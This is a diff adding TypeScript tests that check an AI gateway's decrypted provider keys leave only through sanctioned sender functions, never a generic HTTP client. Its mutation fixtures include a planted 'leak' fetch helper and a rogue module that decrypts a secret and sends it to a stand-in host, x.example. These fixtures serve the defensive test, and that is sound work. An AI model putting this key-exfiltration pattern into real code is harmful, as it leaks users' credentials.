@@ -1,8 +1,9 @@
 import assert from 'node:assert/strict'
 import { readdirSync, readFileSync } from 'node:fs'
-import { join, relative, resolve, sep } from 'node:path'
+import { join, posix, relative, resolve, sep } from 'node:path'
 import test from 'node:test'
 import ts from 'typescript'
+import { aiGatewayFiles, aiGatewaySourcesWith, isAiGatewayFile } from './_ai-gateway-family.ts'
 
 /**
  * No server code reaches the network with a generic HTTP client, except the files
@@ -317,6 +318,102 @@ test('no file under server/ uses a generic HTTP client, except the named exempti
     'a generic HTTP client — a provider call goes through server/utils/chatbot/outbound.ts (Delify usage: server/utils/ai/delify-usage.ts)')
   const stale = Object.keys(ALLOWED_NETWORK_CLIENTS).filter(file => !found.has(file))
   assert.deepEqual(stale, [], 'an exemption whose file no longer uses a client: remove its entry')
+})
+
+test('the AI gateway family (barrel, every ai-gateway-* part, earlier extractions) is in the scan, and a client planted in any file of it is seen', () => {
+  // `callAi` holds the decrypted key; the gateway is split across files (wave3 4.3), so the
+  // scan must reach every one of them — the directory walk does, this proves it per file.
+  const scanned = serverFiles()
+  const family = aiGatewayFiles()
+  assert.ok(family.length >= 4, JSON.stringify(family))
+  for (const file of family) {
+    assert.ok(scanned.includes(file), `${file} is outside the scan`)
+    assert.ok(!(file in ALLOWED_NETWORK_CLIENTS), `${file} may not be exempt`)
+    const planted = `${readFileSync(join(REPO, file), 'utf8')}\nexport const leak = (url: string) => fetch(url)\n`
+    const line = planted.split('\n').findIndex(text => text.startsWith('export const leak')) + 1
+    assert.deepEqual((networkUses({ [file]: planted }).get(file) ?? []).map(use => use.line), [line], file)
+  }
+  assert.ok(isAiGatewayFile('ai-gateway-new-seam.ts'), 'a new part joins the family — and the server/ walk reads it without a list')
+})
+
+/** The two sanctioned senders, and the one module they may come from. */
+const SANCTIONED_SENDERS = ['safeProviderRequest', 'safeProviderStream']
+const OUTBOUND_MODULE = 'server/utils/chatbot/outbound'
+
+/**
+ * The decrypt check below, over the WHOLE AI gateway family instead of one file at a time,
+ * and by AST instead of a text match: once `ai-gateway.ts` is split, the file that decrypts
+ * the key need not be the file that sends it, and a comment naming `safeProviderStream` (or
+ * the word `callAi`) satisfies the per-file regex. `[]` when the family decrypts a key,
+ * really calls both senders imported from `outbound.ts`, and holds no generic client.
+ */
+function gatewayKeyPathProblems(sources: Map<string, string>): string[] {
+  const problems: string[] = []
+  const decrypting: string[] = []
+  const senders = new Set<string>()
+  for (const [file, source] of sources) {
+    for (const use of networkUses({ [file]: source }).get(file) ?? []) problems.push(`${file}:${use.line} ${use.what} — a generic client in the AI gateway`)
+    const sf = ts.createSourceFile(file, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS)
+    const fromOutbound = new Set<string>()
+    for (const statement of sf.statements) {
+      if (!ts.isImportDeclaration(statement) || !ts.isStringLiteral(statement.moduleSpecifier) || statement.importClause?.isTypeOnly) continue
+      const target = posix.normalize(posix.join(posix.dirname(file), statement.moduleSpecifier.text)).replace(/\.ts$/, '')
+      const bindings = statement.importClause?.namedBindings
+      if (target !== OUTBOUND_MODULE || !bindings || !ts.isNamedImports(bindings)) continue
+      for (const element of bindings.elements) if (!element.isTypeOnly && !element.propertyName) fromOutbound.add(element.name.text)
+    }
+    const visit = (node: ts.Node) => {
+      if (ts.isCallExpression(node) && ts.isIdentifier(node.expression)) {
+        if (node.expression.text === 'decryptAiSecret') decrypting.push(file)
+        if (SANCTIONED_SENDERS.includes(node.expression.text) && fromOutbound.has(node.expression.text)) senders.add(node.expression.text)
+      }
+      ts.forEachChild(node, visit)
+    }
+    visit(sf)
+  }
+  if (decrypting.length === 0) problems.push('no file of the AI gateway decrypts a key — this check reads nothing')
+  for (const name of SANCTIONED_SENDERS)
+    if (!senders.has(name)) problems.push(`the AI gateway never calls ${name} imported from outbound.ts — where does the decrypted key go?`)
+  return problems
+}
+
+test('the AI gateway, read as one family: it decrypts the key and sends it only through outbound.ts calls — never a generic client', () => {
+  assert.deepEqual(gatewayKeyPathProblems(aiGatewaySourcesWith()), [])
+})
+
+test('proof: the family key-path check goes red where the per-file text check stays green', () => {
+  const call = 'server/services/ai-gateway-call.ts'
+  const real = aiGatewaySourcesWith().get(call)!
+  const mutate = (from: string | RegExp, to: string) => {
+    assert.ok(typeof from === 'string' ? real.includes(from) : from.test(real), `${call} no longer has ${String(from)} to mutate`)
+    return aiGatewaySourcesWith({ [call]: real.replace(from as never, to) })
+  }
+  const perFileRegex = /safeProviderRequest|safeProviderStream|fetchDelifyUsage|callAi\b/
+
+  // A bare fetch in place of the stream sender.
+  const bare = gatewayKeyPathProblems(mutate('=> safeProviderStream({', '=> fetch(providerCall.url as never, {'))
+  assert.ok(bare.some(problem => problem.startsWith(`${call}:`) && problem.endsWith('a generic client in the AI gateway')), JSON.stringify(bare))
+  assert.ok(bare.includes('the AI gateway never calls safeProviderStream imported from outbound.ts — where does the decrypted key go?'), JSON.stringify(bare))
+
+  // Both senders gone, named only in a comment: the per-file regex is fooled, the family check is not.
+  const commentOnly = real.replace(/safeProvider(Request|Stream)\(/g, 'send$1(') + '\n// sent via safeProviderRequest / safeProviderStream\n'
+  assert.match(commentOnly, perFileRegex)
+  assert.deepEqual(gatewayKeyPathProblems(aiGatewaySourcesWith({ [call]: commentOnly })), SANCTIONED_SENDERS.map(name =>
+    `the AI gateway never calls ${name} imported from outbound.ts — where does the decrypted key go?`))
+
+  // Senders taken from a look-alike module instead of outbound.ts.
+  assert.equal(gatewayKeyPathProblems(mutate("from '../utils/chatbot/outbound'", "from './ai-gateway-transport'")).length, 2)
+
+  // Nothing decrypts any more: the check must say it reads nothing, not pass.
+  assert.deepEqual(gatewayKeyPathProblems(mutate('secret = decryptAiSecret(', 'secret = String(')), [
+    'no file of the AI gateway decrypts a key — this check reads nothing',
+  ])
+
+  // A new part that decrypts and posts on its own is caught too.
+  const rogue = aiGatewaySourcesWith({
+    'server/services/ai-gateway-rogue.ts': "import { decryptAiSecret } from '../utils/ai/crypto'\nexport const send = (e: never) => fetch('https://x.example', { headers: { a: decryptAiSecret(e) } })\n",
+  })
+  assert.deepEqual(gatewayKeyPathProblems(rogue).filter(problem => problem.startsWith('server/services/ai-gateway-rogue.ts:')).length, 1)
 })
 
 test('the code that decrypts an AI key never reaches the network on its own', () => {
